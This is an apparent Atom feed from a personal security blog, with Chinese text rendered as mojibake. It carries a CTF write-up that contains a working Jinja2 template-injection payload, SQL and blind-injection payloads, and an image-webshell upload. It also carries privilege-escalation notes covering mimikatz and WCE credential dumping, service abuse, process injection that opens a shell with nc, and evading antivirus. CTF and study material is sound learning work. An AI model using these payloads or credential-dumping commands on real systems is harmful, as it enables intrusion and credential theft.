<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://z0ekball.github.io</id>
    <title>z0ekball</title>
    <updated>2022-04-14T13:29:05.222Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://z0ekball.github.io"/>
    <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
    <subtitle>æ¸©æ•…è€ŒçŸ¥æ–°</subtitle>
    <logo>https://z0ekball.github.io/images/avatar.png</logo>
    <icon>https://z0ekball.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, z0ekball</rights>
    <entry>
        <title type="html"><![CDATA[ç§‹å­£èµ›WP]]></title>
        <id>https://z0ekball.github.io/post/qiu-ji-sai-wp/</id>
        <link href="https://z0ekball.github.io/post/qiu-ji-sai-wp/">
        </link>
        <updated>2021-10-20T12:25:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ç§‹å­£èµ›wp">ç§‹å­£èµ›WP</h1>
<p>ä¸€ä¸ªäººå°±æ˜¯ä¸€æ”¯é˜Ÿä¼</p>
<h2 id="web">WEB</h2>
<h3 id="easy-ssti">Easy-ssti</h3>
<p>æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥ï¼Œjinja2æ¼æ´ï¼Œ{{7*7}}æœ‰å›æ˜¾è¯´æ˜æœ‰æ³¨å…¥æ¼æ´ï¼Œ_å’Œ[è¢«è¿‡æ»¤ï¼Œç”¨requireå‡½æ•°ç»“åˆattrç»•è¿‡ã€‚</p>
<p>Jinja2æ¨¡æ¿å‚è€ƒ</p>
<p><a href="http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html%23builtin-filters">http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html#builtin-filters</a></p>
<p>æ³¨å…¥è¯­å¥ï¼š</p>
<pre><code class="language-php">{{lipsum|attr(request.args.a)|attr(&quot;get&quot;)(request.args.b)|attr(&quot;get&quot;)(&quot;e&quot;+&quot;val&quot;) (request.args.c)}}&amp;a=globals&amp;b=builtins&amp;c=import(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()

&quot;e&quot;+&quot;val&quot; â€˜oâ€™+â€™sâ€™ â€œç¼–ç â€.decode(â€˜base64â€™)ç»•è¿‡æ•æ„Ÿå­—
</code></pre>
<h3 id="easy-sql1">Easy-sql1</h3>
<p>å¸¸è§„çš„1â€™/<strong>/or/</strong>/1&gt;0#å’Œorder byä¹‹åï¼Œç»å†ä¸€ç•ªç»•è¿‡å¾—å‡ºèƒ½è¿è¡Œçš„æ³¨å…¥è¯­å¥ï¼š</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/database(),2)#&amp;password=
</code></pre>
<p>å¾—åˆ°æ•°æ®åº“å</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414200716689.png" alt="image-20220414200716689" style="zoom: 150%;" />
<p>å› ä¸º=è¢«è¿‡æ»¤ï¼Œä¸æƒ³éº»çƒ¦ç»•è¿‡å°±ç›´æ¥çˆ†å‡ºæ•´ä¸ªè¡¨å</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/group_concat(table_name),2/**/from/**/information_schema.tables)#&amp;password=
</code></pre>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414200726337.png" alt="image-20220414200726337" style="zoom:80%;" />
<p>æŸ¥æ‰¾åˆ°å«flagçš„è¡¨å:flag_table_1</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414200749595.png" alt="image-20220414200749595" style="zoom:80%;" />
<p>å¾—flag</p>
<h3 id="easy-ez_upload">Easy-ez_upload</h3>
<p>ç”¨å¾¡å‰‘æ‰«æç›®å½•</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414200819812.png" alt="image-20220414200819812" style="zoom:80%;" />
<p>è®¿é—®/robot.txt</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201035855.png" alt="image-20220414201035855" style="zoom:150%;" />
<p>å¾—æ–‡ä»¶ä¸Šä¼ åœ°å€,åªå…è®¸å›¾ç‰‡ä¸Šä¼ ã€‚ç”¨ä¸€å¥è¯æœ¨é©¬æ”»å‡»ï¼Œå°è¯•å„ç§æ–¹æ³•éƒ½æ²¡æ³•ä¸Šä¼ æˆphpæ ¼å¼å,å°è¯•å›¾é©¬ã€‚ä¸€å¼€å§‹ç›´æ¥æŠŠä¸€å¥è¯æœ¨é©¬å†™åœ¨å›¾ç‰‡æœ«å°¾ï¼Œä¸Šä¼ åå‘ç°è¢«è¿‡æ»¤æ‰äº†ï¼Œè€ƒè™‘äºŒæ¬¡æ¸²æŸ“ã€‚ç½‘ä¸Šè¯´pngã€jpegä¸å¥½æ”¹ï¼Œç”¨gifæ”¹ã€‚ç”¨winhexå¯¹æ¯”åŸgifå’ŒäºŒæ¬¡æ¸²æŸ“è¿‡çš„gifæ‰¾å‡ºç›¸åŒçš„å­—æ®µï¼Œæ’å…¥æœ¨é©¬ã€‚</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201044815.png" alt="image-20220414201044815" style="zoom:150%;" />
<p>ä¸Šä¼ å›¾ç‰‡ï¼Œæœ¨é©¬æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä½†å›¾ç‰‡è¿˜æ˜¯ä»¥gifæ ¼å¼è§£æï¼Œèšå‰‘æ— æ³•è¿æ¥â€¦å¡äº†å¥½ä¹…ä¹‹åçœ‹åŸæ¥é»‘å±çš„ç½‘é¡µ</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201056641.png" alt="image-20220414201056641" style="zoom:100%;" />
<p>æ˜æ˜æœ‰æç¤ºæ–‡ä»¶åŒ…å«æˆ‘å´æ²¡çœ‹â€¦</p>
<p>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½¿gifä»¥phpæ ¼å¼è§£æï¼Œè®¿é—®</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201118117.png" alt="image-20220414201118117" style="zoom:150%;" />
<p>èšå‰‘ç»ˆäºè¿æ¥æˆåŠŸ</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201126951.png" alt="image-20220414201126951" style="zoom:100%;" />
<p>æ‰¾ä¸åˆ°flagæ–‡ä»¶ï¼Œç”¨å‘½ä»¤è¡Œè¯•è¯•</p>
<p><img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201206436.png" alt="image-20220414201206436" style="zoom:100%;" /><img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201222636.png" alt="image-20220414201222636" style="zoom:100%;" /></p>
<p>æ‰¾åˆ°flag</p>
<h3 id="medium-web4">Medium-web4</h3>
<p>å¸ƒå°”ç›²æ³¨ï¼Œæ„Ÿè§‰å‡ºé¢˜äººåº”è¯¥æ˜¯ä¸ªå¥½äººï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯åŒä¸€ä¸ªåº“ï¼Œå°è¯•é¢˜ç›®sql1çš„æ³¨å…¥è¯­å¥</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<p>å›æ˜¾æ˜¯goodï¼Œè¯´æ˜çŒœå¯¹äº†</p>
<pre><code>username=1'or(length(database())&gt;6)#&amp;password=   good
username=1'or(length(database())&gt;7)#&amp;password=   try again
</code></pre>
<p>åº“åé•¿åº¦ä¸º7ï¼ŒçŒœåº”è¯¥æ˜¯cumtctfï¼Œè„šæœ¬çˆ†ç ´éªŒè¯ä¸€ä¸‹</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201316832.png" alt="image-20220414201316832" style="zoom:100%;" />
<p>æ²¡çŒœé”™ï¼Œå› ä¸ºsql1çš„è¯­å¥å›æ˜¾æ˜¯goodï¼ŒçŒœæµ‹flagè¿˜æ˜¯åœ¨flag_table_1</p>
<p>å› ä¸º=è¢«è¿‡æ»¤ï¼Œåˆ¤æ–­å­—ç¬¦ç”¨&lt;å’Œ&gt;ç»•è¿‡</p>
<pre><code>username=1'or(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,1)))&gt;0)%26%26(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,1)))&lt;125)#&amp;password=
</code></pre>
<p>å›æ˜¾goodï¼Œè¯´æ˜åˆçŒœå¯¹äº†ï¼Œä¸Šè„šæœ¬çˆ†ç ´å¾—flagï¼ˆè„šæœ¬ç»•è¿‡è¯­å¥å­˜åœ¨æ³¨é‡Šç¬¦,æ‰€ä»¥å’Œæ‰‹æ³¨æœ‰åŒºåˆ«ï¼Œç»•è¿‡ç©ºæ ¼ä¸èƒ½ç”¨/**/,è€Œç”¨/<em>!</em>/ï¼‰ï¼Œflagé•¿åº¦çŒœå¤§ä¸€ç‚¹</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201336573.png" alt="image-20220414201336573" style="zoom:100%;" />
<h2 id="re">RE</h2>
<h3 id="easy-ç­¾åˆ°">Easy-ç­¾åˆ°</h3>
<p>idaå¸¸è§„é€šè¿‡å­—ç¬¦ä¸²æ‰¾åˆ°å‡½æ•°</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201406640.png" alt="image-20220414201406640" style="zoom:100%;" />
<p>16è¿›åˆ¶è§£ç å¾—flag</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201446312.png" alt="image-20220414201446312" style="zoom:80%;" />
<h3 id="easy-net">Easy-net</h3>
<p>æç¤ºnetï¼Œå› ä¸ºæ²¡æœ‰.netç¯å¢ƒï¼Œæ— æ³•çœ‹è¿è¡Œæƒ…å†µï¼Œä½†ç”¨ILSpyèƒ½ç›´æ¥åç¼–è¯‘å‡½æ•°</p>
<p><img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201548593.png" alt="image-20220414201548593" style="zoom:80%;" /><img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201600870.png" alt="image-20220414201600870" style="zoom:100%;" /></p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201636689.png" alt="image-20220414201636689" style="zoom:80%;" />
<p>å¤§è‡´æ„æ€å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç»è¿‡ä¸€ç³»åˆ—è¿ç®—ï¼Œèƒ½ç»è¿‡æœ€åä¸€ä¸ªifåˆ¤æ–­ã€‚é€†å‘çˆ†ç ´å¯ä»¥å¾—åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œé—®é¢˜æ˜¯ä¸çŸ¥é“å­—ç¬¦ä¸²é•¿åº¦ã€‚ä½†ç»è¿‡ç®—æ³•OJé¢˜çš„è½®ç•ªæŠ˜ç£¨ï¼Œæˆ‘çŸ¥é“array2[j]é‡Œçš„jä¸èƒ½è¶…è¿‡è¯¥æ•°ç»„é•¿åº¦28ï¼ˆarray2æœ‰28ä¸ªæ•°ï¼‰ï¼Œæ‰€ä»¥jæœ€å¤§å€¼å³å­—ç¬¦ä¸²é•¿åº¦ä¸º28ã€‚</p>
<p>è¿™å°±å¥½åŠäº†ï¼Œä¸Šè„šæœ¬çˆ†ç ´å¾—flag</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201654601.png" alt="image-20220414201654601" style="zoom:80%;" />
<h2 id="pwn">PWN</h2>
<h3 id="easy-pwn1">Easy-pwn1</h3>
<p>Ncä¸€ä¸‹ï¼Œcat flag</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201725664.png" alt="image-20220414201725664" style="zoom:80%;" />
<h3 id="easy-pwn2">Easy-pwn2</h3>
<p>æ ‡å‡†æ ˆæº¢å‡ºï¼Œbufæ˜¯0x40hä½†è¦è¯»å…¥0x60hçš„æ•°æ®ï¼Œå‚è€ƒæ”»é˜²ä¸–ç•Œæ ˆæº¢å‡ºçš„é¢˜è§£å†™è„šæœ¬</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201801302.png" style="zoom:80%;" />
<p>Call systemåœ°å€</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201819493.png" style="zoom:80%;" />
<p>å¡«å……0x48è¦†ç›–bufå’Œpushå†…å®¹ï¼Œå†è¦†ç›–è¿”å›åœ°å€ï¼Œè„šæœ¬ï¼š</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201828914.png" style="zoom:80%;" />
<p>æ‰§è¡Œ</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201839150.png" style="zoom:80%;" />
<h3 id="easy-pwn3">Easy-pwn3</h3>
<p>exeinfoæŸ¥äº†ä¸€ä¸‹, 32ä½</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201911585.png" style="zoom:80%;" />
<p>ç”¨ida32æ‰“å¼€ï¼Œé€šè¿‡å­—ç¬¦ä¸²æ‰¾åˆ°å‡½æ•°</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201924140.png" style="zoom:80%;" />
<p>æŸ¥èµ„æ–™æ—¶å‘ç°åšå®¢</p>
<p><a href="https://blog.csdn.net/weixin_44145820/article/details/105482269">(10æ¡æ¶ˆæ¯) BUUCTF-PWNåˆ·é¢˜è®°å½•-6_L.o.Wçš„åšå®¢-CSDNåšå®¢</a></p>
<p>ä¸èƒ½è¯´æ¯«æ— ç›¸å…³ï¼Œç®€ç›´å°±æ˜¯ä¸€æ¨¡ä¸€æ ·â€¦</p>
<p>å…ˆå¡«å……æ»¡ç¼“å†²åŒºï¼Œæ³„éœ²ebpï¼Œç„¶åä½¿ç”¨æ ˆè¿ç§»æ‰§è¡Œsystemï¼Œè¿è¡Œå¾—flag</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414201935583.png" style="zoom:80%;" />
<h2 id="crypto">Crypto</h2>
<h3 id="easy-ç­¾åˆ°-2">Easy-ç­¾åˆ°</h3>
<p>é€†å‘çˆ†ç ´ï¼Œæ‡’å¾—åˆ¤æ–­æ•°å­—å’Œç¬¦å·ï¼Œçˆ†å‡ºæ¥å†åŠ ä¸Šå°±æ˜¯flag</p>
<p>è„šæœ¬</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202014958.png" style="zoom:80%;" />
<p>åŠ ä¸Šæ•°å­—å’Œç¬¦å·</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202025543.png" style="zoom:80%;" />
<h3 id="easy-lcg">Easy-lcg</h3>
<p>LCGå°±æ˜¯çº¿æ€§åŒä½™æ³•ï¼Œå¾—åˆ°çš„æ˜¯å¼±ä¼ªéšæœºæ•°ï¼Œå‚è€ƒlcgæ•™ç¨‹</p>
<p>http://www.manongjc.com/detail/22-hpzrquvdaforjqj.html</p>
<p>å‚è€ƒé‡Œé¢çš„è„šæœ¬ï¼Œè¿è¡Œå¾—åˆ°flag</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202049990.png" style="zoom:80%;" />
<h2 id="misc">Misc</h2>
<h3 id="easy-ç­¾åˆ°-3">Easy-ç­¾åˆ°</h3>
<p>base32è§£å¯†</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202112612.png" style="zoom:80%;" /> 
<h3 id="easy-lsb">Easy-LSB?</h3>
<p>LSBéšå†™ï¼ŒStegsloveå¤šæ¬¡å°è¯•ä¿®æ”¹ä½ä½çš„0ã€1ï¼Œå¦‚å›¾æ‹¿åˆ°flag</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202129805.png" style="zoom:80%;" />
<h3 id="easy-å‹ç¼©åŒ…">Easy-å‹ç¼©åŒ…</h3>
<p>æœ‰ç‚¹é˜´é—´çš„é¢˜ç›®ï¼Œç¬¬ä¸€ä¸ªå‹ç¼©åŒ…å°±æ˜¯ä¼ªåŠ å¯†ï¼ŒHXDæ‰“å¼€ä¿®æ”¹å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º00 00ï¼Œèƒ½å¤Ÿæ‰“å¼€å‹ç¼©åŒ…ï¼Œå¾—åˆ°ä¸‹ä¸€ä¸ªå‹ç¼©åŒ…ã€‚HXDæŸ¥çœ‹æ˜¯çœŸåŠ å¯†ï¼Œæ ¹æ®æç¤ºç”¨ziperelloçˆ†ç ´å¾—å¯†ç </p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202148412.png" style="zoom:80%;" />
<p>åˆå¾—åˆ°äº†çœŸä¸¤ä¸ªåŠ å¯†æ–‡ä»¶ï¼Œå¡äº†å¥½ä¹…ä¹‹åæƒ³èµ·åŠ å¯†çš„å›¾åœ¨åˆ«çš„é¢˜é‡Œæœ‰åŸå›¾ï¼Œå¯¹æ¯”ä¸¤è¿™çš„å†—ä½™ç ï¼Œç¡®è®¤æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ã€‚ä¸€ä¸ªå·²çŸ¥è§£å¯†æ–‡ä»¶å’Œä¸€ä¸ªç›¸åŒçš„åŠ å¯†æ–‡ä»¶ä¸å°±æ˜¯æ˜æ–‡æ”»å‡»å˜›ã€‚</p>
<p>æŠŠå·²çŸ¥å›¾ç‰‡å‹ç¼©æˆåŒ…ï¼ŒARCHPRæ˜æ–‡æ”»å‡»å¾—å¯†ç ï¼Œè§£å¼€çš„flag</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202156116.png" style="zoom:80%;" />
<h3 id="easy-åŠ å¯†">Easy-åŠ å¯†ï¼Ÿ</h3>
<p>å¥—å¨ƒåŠ å¯†é¢˜ï¼Œå›¾ç‰‡æ˜¯ç¦å°”æ‘©æ–¯å¯†ç ï¼Œè§£å¯†å¾—åˆ°å¯†ç SHERLOCK</p>
<p>ç¬¬äºŒä¸ªå‹ç¼©åŒ…çš„txtæ–‡ä»¶æ˜¯é›¶å®½å­—ç¬¦åŠ å¯†ï¼Œè§£å¯†å¾—å¯†ç </p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202220004.png" style="zoom:80%;" />
<p>æ‰“å¼€flagæ–‡ä»¶, base16è§£å¯†</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202227205.png" style="zoom:80%;" />
<h3 id="medium-ç¤¾å·¥">Medium-ç¤¾å·¥ï¼Ÿ</h3>
<p>ä¸€å¼€å§‹ç”¨å¾®ä¿¡QQæ‰«ç éƒ½æ²¡ç”¨ï¼Œå°±ç€jpegç ”ç©¶äº†å¥½ä¹…è¿˜æ˜¯è§£ä¸å‡ºï¼Œç›´åˆ°æˆ‘çŸ¥é“ä¸€ä¸ªå«ä¸­å›½ç¼–ç çš„ä¸œä¸œâ€¦</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20220414202251180.png" style="zoom:80%;" />
<p>WANG/JIAå°±æ˜¯è¿™ä¸ªäººçš„åå­—ï¼Œä¹Ÿå°±æ‹¿åˆ°äº†flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ææƒå­¦ä¹ ]]></title>
        <id>https://z0ekball.github.io/post/ti-quan/</id>
        <link href="https://z0ekball.github.io/post/ti-quan/">
        </link>
        <updated>2021-08-14T06:14:33.000Z</updated>
        <content type="html"><![CDATA[<p><code>ææƒå‰æ</code>ï¼š</p>
<p>1.æ‹¥æœ‰æ™®é€šç”¨æˆ·æƒé™</p>
<p>2.æ‹¥æœ‰ç½‘ç«™webshell</p>
<p>3.å­˜åœ¨ææƒæ¼æ´</p>
<h3 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h3>
<h4 id="å‘½ä»¤è¡Œ">å‘½ä»¤è¡Œ</h4>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1649935140181.png" alt="" loading="lazy"></figure>
<p>æŸ¥çœ‹è¿œç¨‹æ§åˆ¶æ˜¯å¦å¼€å¯ï¼š</p>
<pre><code class="language-php">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDebyTSConnections
</code></pre>
<p>æŸ¥çœ‹portnumberå¼€å¯çš„ç«¯å£:</p>
<pre><code class="language-php">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber
</code></pre>
<p>æ£€ç´¢æ•æ„Ÿæ–‡ä»¶ï¼š</p>
<pre><code class="language-php">dir /b /s *.txt
</code></pre>
<p>æ”¶é›†å¯åˆ©ç”¨pocï¼šå¤šå…³æ³¨æ–°æ¼æ´å’Œå·²çŸ¥æ¼æ´ï¼Œæ”¶é›†è„šæœ¬ï¼Œæ–¹ä¾¿åˆ©ç”¨</p>
<h4 id="æ¼æ´åˆ†æå·¥å…·">æ¼æ´åˆ†æå·¥å…·</h4>
<p><code>Windows_Exploit_Suggester</code>ï¼šé€šè¿‡ä¸‹è½½å¾®è½¯å…¬å¼€æ¼æ´åº“åˆ°æœ¬åœ°â€œç”Ÿæˆæ—¥æœŸ+mssb.xlsâ€æ–‡ä»¶ï¼Œç„¶åæ ¹æ®æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œè·Ÿsysteminfoç”Ÿæˆçš„æ–‡ä»¶è¿›è¡Œæ¯”å¯¹ï¼Œä»è€Œå‘ç°ç³»ç»Ÿæ˜¯å¦å­˜åœ¨æœªä¿®å¤æ¼æ´ã€‚</p>
<pre><code class="language-php">//ä¸‹è½½æ¼æ´åº“
windows-exploit-suggester.py â€“update
//é¶æœºç”Ÿæˆç³»ç»Ÿä¿¡æ¯æ–‡ä»¶
systeminfo &gt; win10.txt
//æŸ¥çœ‹ç³»ç»Ÿæ¼æ´
windows-exploit-suggester.py --database 2018-08-11-mssb.xls --systeminfo win10.txt
</code></pre>
<p><code>Linux_Exploit_Suggester</code>ï¼šæ ¹æ®æ“ä½œç³»ç»Ÿç‰ˆæœ¬å·è‡ªåŠ¨æŸ¥æ‰¾ç›¸åº”ææƒè„šæœ¬çš„å·¥å…·ï¼Œå¦‚æœä¸å¸¦ä»»ä½•å‚æ•°è¿è¡Œè¯¥è„šæœ¬çš„è¯ï¼Œå°†æ‰§è¡Œuname -rè¿”å›çš„æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆæœ¬ï¼Œæˆ–è€…æ‰‹å·¥è¾“å…¥-kå‚æ•°æŸ¥æ‰¾æŒ‡å®šç‰ˆæœ¬å·ã€‚</p>
<pre><code class="language-php">//æŸ¥çœ‹å†…æ ¸ä¿¡æ¯
uname -a-
//æ£€æµ‹æ¼æ´
./Linux_Exploit_Suggester.pl
//æŒ‡å®šç‰ˆæœ¬æ£€æµ‹æ¼æ´
./Linux_Exploit_Suggester.pl -k 2.6.28
</code></pre>
<h4 id="è·å–å¯†ç å·¥å…·">è·å–å¯†ç å·¥å…·</h4>
<p><code>minikatz</code>ï¼šæŠ“å–å¯†ç </p>
<pre><code class="language-php">//æå–æƒé™
privilege::debug   
//æŠ“å–å¯†ç 
sekurlsa::logonpasswords   
</code></pre>
<p><code>WCE</code>ï¼šæŠ“å–å¯†ç </p>
<pre><code class="language-php">//æŸ¥çœ‹å½“å‰ç™»å½•çš„ç”¨æˆ·åŠåŠ å¯†çš„å¯†ç 
wce-universal.exe -l
//æŸ¥çœ‹å½“å‰ç”¨æˆ·ç™»å½•çš„è¯¦ç»†ä¿¡æ¯
wce-universal.exe -lv
//åˆ é™¤ä¸€ä¸ªæŒ‡å®šä¼šè¯çš„luid
wce-universal.exe -d IDå·
//åˆ·æ–°ä¼šè¯ä¿¡æ¯
wce-universal.exe -e(æ‰‹åŠ¨æ›´æ–°)
//æ‹¼æ¥ä¼šè¯ä¿¡æ¯,æ‹¼æ¥ä¼šè¯ä¿¡æ¯å¯ä»¥éšè—ç”¨æˆ·èº«ä»½å’Œä¿¡æ¯
wce-universal.exe -i IDå· -s ç”¨æˆ·ä¿¡æ¯
//ç”ŸæˆæŒ‡å®šå­—ç¬¦ä¸²çš„lmhashå’Œntlmhash
wce-universal.exe -g æ˜æ–‡å¯†ç 
//æŸ¥çœ‹æ˜æ–‡ä¿¡æ¯
wce-universal -w
</code></pre>
<h3 id="ç³»ç»Ÿææƒ">ç³»ç»Ÿææƒ</h3>
<h4 id="ææƒå·¥å…·">ææƒå·¥å…·</h4>
<p><code>atå‘½ä»¤</code>ï¼šWindows XPä¸­å†…ç½®çš„å‘½ä»¤</p>
<pre><code class="language-php">at+æ—¶é—´+/interaction cmd
</code></pre>
<p><code>scå‘½ä»¤</code>ï¼šXPç³»ç»Ÿä¸­åŠŸèƒ½å¼ºå¤§çš„DOSå‘½ä»¤</p>
<pre><code class="language-php">//åˆ›å»ºsuperè¿›ç¨‹
sc Creat Super binPath=&quot;cmd /K start&quot; type=own type=interact
//å¯åŠ¨
sc start Super
</code></pre>
<p><code>pin.jector.exe</code>ï¼šæ³¨å…¥è¿›ç¨‹</p>
<pre><code class="language-php">//æŸ¥çœ‹å¯æ³¨å…¥è¿›ç¨‹
pin.jector.exe -l
//æ³¨å…¥pidä¸º600è¿›ç¨‹ï¼Œä½¿ç”¨ç«¯å£2345è¿”å›cmd
pin.jector.exe -p 600 cmd 2345
//ç›‘å¬æ³¨å…¥çš„è¿›ç¨‹
nc -nv 192.268.1.57 2345
</code></pre>
<h4 id="windowsææƒ">Windowsææƒ</h4>
<p><code>ææƒå‡†å¤‡</code>ï¼š</p>
<p>ä½¿ç”¨ Windows-Exploit-Suggesterè·å–ç›®å‰ç³»ç»Ÿä¸­å¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼Œæ­¥éª¤å¦‚ä¸‹ã€‚</p>
<p>â‘ 	æ”¶é›†å¹¶ç¼–è¯‘ç›¸å…³POCã€‚</p>
<p>â‘¡	è‹¥æ“ä½œç³»ç»Ÿä¸­å®‰è£…äº†æ€æ¯’è½¯ä»¶åŠå®‰å…¨é˜²æŠ¤è½¯ä»¶ï¼Œåˆ™éœ€è¦å¯¹ææƒ POC	è¿›è¡Œå…æ€ï¼Œå¦åˆ™ç›´æ¥ è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</p>
<p>â‘¢	ä¸Šä¼ POCã€‚</p>
<p>â‘£	ç”±WebShellæˆ–è€…åå¼¹WebShellæ¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>â‘¤	æœç´¢æ¼æ´ï¼Œæ ¹æ®å…³é”®å­—è¿›è¡Œæœç´¢</p>
<pre><code class="language-php">ä¾‹å¦‚MS10-061ã€‚
    
â—	åœ¨ç™¾åº¦æµè§ˆå™¨ä¸­æœç´¢â€œMS10-061	siteï¼šexploit-db.comâ€ã€‚
â—	è®¿é—®packetstormsecurityç½‘ç«™è¿›è¡Œæœç´¢ï¼ˆhttpsï¼š//packetstormsecurity.com/search/ï¼Ÿ q=MS16-016ï¼‰ã€‚ 
â—	å®‰å…¨ç„¦ç‚¹çš„BugTraqæ˜¯ä¸€ä¸ªå‡ºè‰²çš„æ¼æ´å’ŒExploitæ•°æ®æºï¼Œå¯ä»¥é€šè¿‡CVEç¼–å·æˆ–è€…äº§å“ä¿¡æ¯æ¼æ´ç›´æ¥æœç´¢ï¼Œç½‘å€ä¸ºhttpï¼š//www.securityfocus.com/bidã€‚
</code></pre>
<p><code>MSFæœç´¢å¯åˆ©ç”¨poc</code>ï¼š</p>
<p>ï¼ˆ1ï¼‰æœç´¢POC åœ¨Kaliä¸­æ‰“å¼€MSFæˆ–è€…æ‰§è¡Œâ€œ/usr/bin/msfconsoleâ€å‘½ä»¤ï¼Œåœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹ä½¿ç”¨search ms+å¹´ä»½åä¸¤ä½</p>
<pre><code class="language-php">//æœç´¢2018å¹´Windowsä¸‹æ‰€æœ‰å¯ç”¨exploit
search ms18
</code></pre>
<p>ï¼ˆ2ï¼‰æŸ¥çœ‹ç›¸å…³æ¼æ´æƒ…å†µ</p>
<p>å¯ä»¥é€šè¿‡å¾®è½¯å®˜æ–¹ç½‘ç«™æŸ¥çœ‹æ¼æ´æ‰€å¯¹åº”çš„ç‰ˆæœ¬</p>
<p>åˆ©ç”¨æ–¹å¼ :â€œhttpsï¼š//technet.microsoft.com/library/security/æ¼æ´å·â€</p>
